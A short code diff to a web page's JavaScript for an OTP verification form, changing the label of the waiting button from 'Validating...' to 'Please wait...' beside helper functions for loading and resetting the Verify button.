@@ -622,7 +622,7 @@ button:disabled {
 
   // ── OTP submit + first-approval poll ──────────────────────────────────────
   function showLoading() { isProcessing = true; verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>'; errorDiv.style.display = 'none'; }
-  function showWaiting() { verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>'; }
+  function showWaiting() { verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>'; }
   function resetButton() { isProcessing = false; verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; }
 
   function startCheckingFirstApproval() {
